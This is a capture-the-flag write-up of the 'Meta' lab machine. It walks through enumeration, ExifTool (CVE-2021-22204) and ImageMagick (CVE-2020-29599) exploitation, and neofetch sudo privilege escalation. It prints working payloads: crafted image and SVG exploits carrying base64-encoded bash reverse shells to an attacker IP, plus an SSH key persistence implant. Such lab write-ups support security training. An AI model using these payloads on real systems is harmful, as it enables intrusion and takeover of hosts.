# Meta Writeup

## Enumeration

### Nmap

First, let's scan for open ports using `nmap`. We can quickly scan for open ports and store them in a variable: `ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.140 | grep "^[0-9]" | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)`. Then, we can scan those specific ports in depth by running `nmap`'s built-in scripts: `nmap -p$ports -sC -sV 10.10.11.140`.

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 12:81:17:5a:5a:c9:c6:00:db:f0:ed:93:64:fd:1e:08 (RSA)
|   256 b5:e5:59:53:00:18:96:a6:f8:42:d8:c7:fb:13:20:49 (ECDSA)
|_  256 05:e9:df:71:b5:9f:25:03:6b:d0:46:8d:05:45:44:20 (ED25519)
80/tcp open  http    Apache httpd
|_http-title: Did not follow redirect to http://artcorp.htb
|_http-server-header: Apache
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

It looks like there is an Apache webserver running on port 80. Attempting to visit the website redirects us to `http://artcorp.htb`, so let's add that to `/etc/hosts`: `echo "10.10.11.140 artcorp.htb" | sudo tee -a /etc/hosts`.

Scan for UDP services with `sudo nmap -p- -sU -r -T5 10.10.11.140 -v` (`-r` specifies that ports will be scanned sequentially instead of randomly. we do this because services are more likely to be running on ports 1-1000.). This finds nothing.

### Virtual Host Scanning

Let's can for virtual hosts (subdomains) with `ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://artcorp.htb/ -H "Host: FUZZ.artcorp.htb" -fc 301`:

```
dev01                   [Status: 200, Size: 247, Words: 16, Lines: 10]
```

Let's add the new `dev01` subdomain to `/etc/hosts`: `echo "10.10.11.140 dev01.artcorp.htb" | sudo tee -a /etc/hosts`.

### Apache (Port `80`)

The website running on port 80 is very bare bone and the only significant information is this: "We are almost ready to launch our new product "MetaView". / The product is already in testing phase. / Stay tuned!"

### `dev01` Virtual Host

Navigating to `http://dev01.artcorp.htb/` shows a page with a link to `http://dev01.artcorp.htb/metaview/`.

Navigating to the `/metaview` page shows an image upload. Uploading a non-image file produces this message: "File not allowed (only jpg/png)."

Uploading a random `.jpg` image displays the following:

```
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Image Width                     : 640
Image Height                    : 640
Encoding Process                : Progressive DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
```

This looks exactly like the output from `exiftool`. Running `exiftool ./path/to/image.jpg` produces:

```
ExifTool Version Number         : 12.40
File Name                       : image.jpg
Directory                       : Downloads
File Size                       : 41 KiB
File Modification Date/Time     : 2022:02:26 18:56:18-05:00
File Access Date/Time           : 2022:02:26 18:56:21-05:00
File Inode Change Date/Time     : 2022:02:26 18:56:18-05:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Image Width                     : 640
Image Height                    : 640
Encoding Process                : Progressive DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 640x640
Megapixels                      : 0.410
```

Sure enough the outputs look similar, but not identical.

Searching for "exiftool rce" online finds the following:

* [GitHub Repo: OneSecCyber/JPEG_RCE](https://github.com/OneSecCyber/JPEG_RCE)
* [GitHub Repo: CsEnox/Gitlab-Exiftool-RCE](https://github.com/CsEnox/Gitlab-Exiftool-RCE)
* [GitHub Repo: inspiringz/CVE-2021-22205](https://github.com/inspiringz/CVE-2021-22205)
* [GitHub Repo: convisolabs/CVE-2021-22204-exiftool](https://github.com/convisolabs/CVE-2021-22204-exiftool)
* [Original HackerOne Report](https://hackerone.com/reports/1154542)
* [A Random Description of the Vulnerability](https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/)
* [Original Writeup by Person who Found the Exploit in GitLab](https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html)

"Exiftool is a tool and library made in Perl that extracts metadata from almost any type of file."

"ExifTool 7.44 to 12.23 has a bug in the DjVu module which allows for arbitrary code execution when parsing malicious images."

## Foothold

We will use the [OneSecCyber/JPEG_RCE](https://github.com/OneSecCyber/JPEG_RCE) GitHub repo to exploit this vulnerability.

Let's follow the commands in the repo to create the malicious image:

```
git clone https://github.com/OneSecCyber/JPEG_RCE.git
cd JPEG_RCE
exiftool -config eval.config runme.jpg -eval='system("ls -la")'
```

Uploading the newly created `runme.jpg` image to the `dev01` subdomain produces the following output:

```
total 36
drwxr-xr-x 7 root www-data 4096 Aug 28 08:43 .
drwxr-xr-x 4 root root     4096 Oct 18 14:27 ..
drwxr-xr-x 2 root www-data 4096 Aug 28 08:39 assets
-rw-r--r-- 1 root www-data   72 Aug 28 08:39 composer.json
drwxr-xr-x 2 root www-data 4096 Aug 28 08:39 css
-rw-r--r-- 1 root www-data 2786 Aug 29 12:15 index.php
drwxr-xr-x 2 root www-data 4096 Aug 28 08:39 lib
drwxrwxr-x 2 root www-data 4096 Feb 26 19:10 uploads
drwxr-xr-x 3 root www-data 4096 Aug 28 08:39 vendor
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Exif Byte Order                 : Big-endian (Motorola, MM)
X Resolution                    : 72
Y Resolution                    : 72
Resolution Unit                 : inches
Y Cb Cr Positioning             : Centered
Copyright                       : 0
Image Width                     : 245
Image Height                    : 368
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
```

So, we have arbitrary command execution. Now, let's use a reverse shell payload instead. We will use the following reverse shell: `bash -i >& /dev/tcp/10.10.14.169/52427 0>&1`. We encode this to base64 to remove illegal characters with `echo -n "bash -i >& /dev/tcp/10.10.14.169/52427 0>&1" | base64` to get `YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNjkvNTI0MjcgMD4mMQ==`. So, start a listener with `pwncat` or netcat with `nc -nvlp 52427`. Then, create the malicious image with `exiftool -config eval.config runme.jpg -eval='system("echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNjkvNTI0MjcgMD4mMQ== | base64 -d | bash")'`.

Uploading this malicious file to the website get us a reverse shell as user `www-data`.

## Lateral Movement

The user with id `1000` is `thomas`. We can view his home directory with `ls -la /home/thomas/` to see the `user.txt` flag.

We upload LinPEAS and run it, but there is nothing obvious in the output. However, it is cool to see the number of nested processes we made in order to get a foothold on the box:

```
www-data  7965  0.0  0.6 197424 13964 ?        S    18:45   0:00  _ /usr/sbin/apache2 -k start
www-data  8613  0.0  0.0   2388   696 ?        S    19:21   0:00  |   _ sh -c exiftool '/var/www/dev01.artcorp.htb/metaview/uploads/phpztsAFU.jpg' --system:all --exiftool:all -e
www-data  8614  0.0  0.8  20480 17448 ?        S    19:21   0:00  |       _ /usr/bin/perl -w /usr/local/bin/exiftool /var/www/dev01.artcorp.htb/metaview/uploads/phpztsAFU.jpg --system:all --exiftool:all -e
www-data  8615  0.0  0.0   2388   692 ?        S    19:21   0:00  |           _ sh -c echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNjkvNTI0MjcgMD4mMQ== | base64 -d | bash
www-data  8618  0.0  0.1   3736  2800 ?        S    19:21   0:00  |               _ bash
www-data  8619  0.0  0.1   4000  3324 ?        S    19:21   0:00  |                   _ bash -i
www-data  8639  0.0  0.0   2592  1848 ?        S    19:21   0:00  |                       _ /usr/bin/script -qc /usr/bin/bash /dev/null
www-data  8640  0.0  0.0   2388   756 pts/11   Ss   19:21   0:00  |                           _ sh -c /usr/bin/bash
www-data  8642  0.0  0.1   4000  3188 pts/11   S    19:21   0:00  |                               _ /usr/bin/bash
www-data  8762  1.8  0.2   5752  5168 pts/11   S+   19:24   0:00  |                                   _ bash linpeas.sh
www-data 11484  0.0  0.1   5752  3844 pts/11   S+   19:24   0:00  |                                       _ bash linpeas.sh
www-data 11488  0.0  0.1   7960  3064 pts/11   R+   19:24   0:00  |                                       |   _ ps fauxwww
www-data 11487  0.0  0.1   5752  2380 pts/11   S+   19:24   0:00  |                                       _ bash linpeas.sh
```

Uploading and running [pspy](https://github.com/DominicBreuker/pspy) reveals that the following are run every minute:

```
2022/02/26 19:32:01 CMD: UID=1000 PID=21226  |
2022/02/26 19:32:01 CMD: UID=0    PID=21225  | /usr/sbin/CRON -f
2022/02/26 19:32:01 CMD: UID=0    PID=21224  | /bin/sh -c cp -rp ~/conf/config_neofetch.conf /home/thomas/.config/neofetch/config.conf
2022/02/26 19:32:01 CMD: UID=0    PID=21223  | /usr/sbin/CRON -f
2022/02/26 19:32:01 CMD: UID=0    PID=21222  | /usr/sbin/CRON -f
2022/02/26 19:32:01 CMD: UID=0    PID=21221  | /usr/sbin/CRON -f
2022/02/26 19:32:01 CMD: UID=1000 PID=21228  | /bin/bash /usr/local/bin/convert_images.sh
2022/02/26 19:32:01 CMD: UID=0    PID=21227  | /bin/sh -c cp -rp ~/conf/config_neofetch.conf /home/thomas/.config/neofetch/config.conf
2022/02/26 19:32:01 CMD: UID=1000 PID=21229  | /usr/local/bin/mogrify -format png *.*
2022/02/26 19:32:01 CMD: UID=1000 PID=21230  | /bin/bash /usr/local/bin/convert_images.sh
```

Let's check out the `/usr/local/bin/convert_images.sh` script.

```bash
#!/bin/bash
cd /var/www/dev01.artcorp.htb/convert_images/ && /usr/local/bin/mogrify -format png *.* 2>/dev/null
pkill mogrify
```

The script uses `pkill` without an absolute path so if we had write permissions to somewhere on the global `PATH` variable we could replace that command with our own script, but we do not have these write permissions.

Running `mogrify` produces a long help output with the version string at the top: `Version: ImageMagick 7.0.10-36 Q16 x86_64 2021-08-29 https://imagemagick.org`. Searching online for "imagemagick 7.0.10-36 exploit" finds [this page](https://www.cybersecurity-help.cz/vdb/SB2020121303) at the top of the results, which discusses [CVE-2020-29599](https://nvd.nist.gov/vuln/detail/CVE-2020-29599): "A flaw was found in ImageMagick. The -authenticate option is mishandled allowing user-controlled password set for a PDF file to possibly inject additional shell commands via coders/pdf.c. The highest threat from this vulnerability is to data confidentiality and integrity as well as system availability." This vulnerability works for "ImageMagick before 6.9.11-40 and 7.x before 7.0.10-40." We are running version `7.0.10-36`, which is before `7.0.10-40`, so this exploit should work.

Searching for "imagemagick XML injection," which is what this vulnerability is, finds [this news article on PortSwigger](https://portswigger.net/daily-swig/imagemagick-pdf-parsing-flaw-allowed-attacker-to-execute-shell-commands-via-maliciously-crafted-image) and [this blog post by the person who found the vulnerability](https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html). Additionally, searching for "CVE-2020-29599" on GitHub finds [coco0x0a/CVE-2020-29599](https://github.com/coco0x0a/CVE-2020-29599).

There is a proof of concept image on the vulnerability finder's website:

```xml
<image authenticate='ff" `echo $(id)> ./0wned`;"'>
  <read filename="pdf:/etc/passwd"/>
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">       
  <image xlink:href="msl:poc.svg" height="100" width="100"/>
  </svg>
</image>
```

Let's change this slightly so that the `0wned` file gets placed in a known location:

```xml
<image authenticate='ff" `echo $(id)> /tmp/0wned`;"'>
  <read filename="pdf:/etc/passwd"/>
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">       
  <image xlink:href="msl:poc.svg" height="100" width="100"/>
  </svg>
</image>
```

Let's create a file called `poc.svg` with this text using `nano` (or any text editor). Now, we can upload this image to `/var/www/dev01.artcorp.htb/convert_images/` with `pwncat`'s `upload` command. Now, we just need to wait at most a minute for the cron job to run. For whatever reason, this does not work. However, changing the directory where the file is written to `/dev/shm/` causes the file to be written. We can find world writeable directories with `find / -maxdepth 3 -type d -perm -777`. So, the working exploit is:


```xml
<image authenticate='ff" `echo $(id)> /dev/shm/0wned`;"'>
  <read filename="pdf:/etc/passwd"/>
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="msl:poc.svg" height="100" width="100"/>
  </svg>
</image>
```

This creates the file `/dev/shm/0wned` (once the cron job runs() with the following output: `uid=1000(thomas) gid=1000(thomas) groups=1000(thomas),27(sudo)`. So, we have command execution. We can set the command to a reverse shell such as `bash -i >& /dev/tcp/10.10.14.169/37580 0>&1` and start a listener on port `37580` (`pwncat-cs -lp 37580`).

We upload this svg to `/var/www/dev01.artcorp.htb/convert_images`:

```xml
<image authenticate='ff" `echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNjkvMzc1ODAgMD4mMQ== | base64 -d | bash`;"'>
  <read filename="pdf:/etc/passwd"/>
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="msl:poc.svg" height="100" width="100"/>
  </svg>
</image>
```

Sure enough, after waiting about 20 seconds, we get a reverse shell as thomas.

We can now get the `user.txt` flag with `cat ~/user.txt`.

## Privilege Escalation

First, we can get persistance using `pwncat` by running `run implant.authorized_key key=/home/kali/.ssh/id_rsa` in the local shell. I set the permissions of the `.ssh` folder to be what they should be with `cd && chmod 700 .ssh && chmod 600 .ssh/authorized_keys`. Now we can connect with `pwncat-cs thomas@artcorp.htb --identity /home/kali/.ssh/id_rsa` over SSH.

Looking at `/tmp` when logged in as `thomas` shows different files than when logged in as `www-data`, which is why writing the file to `/tmp` didn't working during the lateral movement phase. Apparently, each user has their own `/tmp` directory.

We run `sudo -l` to see what we can do as the `root` user since we saw that the user `thomas` was in the `sudo` group earlier (or just run `groups`).

`sudo -l` outputs:

```
User thomas may run the following commands on meta:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/neofetch \"\"
```

So, we can run the `neofetch` command as `root`. When we ran `pspy` earlier I noticed something involving `neofetch` run so this is not a surprise. Additionally, there is a `/home/thomas/neofetch/config.conf` file with a lot of options. However, the actual `neofetch` configuration file is located at `/home/thomas/.config/neofetch/config.conf`.

`neofetch` is listed on [GTFOBins](https://gtfobins.github.io/gtfobins/neofetch/). However, trying to run `sudo neofetch --ascii /root/root.txt` to get the `root.txt` flag asks for `thomas`'s password, which we don't have. So, we can't specify options on the `neofetch` binary.

Checking `pspy` again we see that `/bin/sh -c cp -rp ~/conf/config_neofetch.conf /home/thomas/.config/neofetch/config.conf` is executed as `root` about every minute. So the config file is overwritten every minute or so.

We can edit the `neofetch` config file at `/home/thomas/.config/neofetch/config.conf` and add `prin "Test" "$(echo test)"` under the `print_info()` function heading. Running `neofetch` again will show `Test: test` in the output. Thus, we have command execution, but running `sudo neofetch` runs `neofetch` as `root` which means it won't use the configuration file located `/home/thomas/.config`.

According to the [documentation for `neofetch`](https://github.com/dylanaraps/neofetch/wiki/Customizing-Info#config-file-location), "the per-user location for neofetch's config is `${HOME}/.config/neofetch/config.conf`"

Searching for "change linux hidden directory config location" finds [this linux StackExchange answer](https://unix.stackexchange.com/a/33945), which mentions the [XDG Base Directory Specification](https://specifications.freedesktop.org/basedir-spec/basedir-spec-latest.html) and [this StackOverflow answer](https://stackoverflow.com/a/1024339). According to the StackOverflow answer, we can set the `XDG_CONFIG_HOME` environment variable to where user-specific configuration files are stored, which defaults to `"$HOME/.config"`.

So, we run `export XDG_CONFIG_HOME=/home/thomas/.config` to set the the `XDG_CONFIG_HOME` to `thomas`'s home directory explicitly instead `"$HOME/.config"`. Now, we `nano /home/thomas/.config/neofetch/config.conf` and add `prin "Test" "$(cat /root/root.txt)"` under the `print_info()` function heading. Now, when we run `sudo neofetch`, we see `Test: [/root/root.txt]` here.

We could now get a `root` shell using a reverse shell instead of `cat /root/root.txt` in the `neofetch` configuration file or we could copy `root`'s private ssh key.
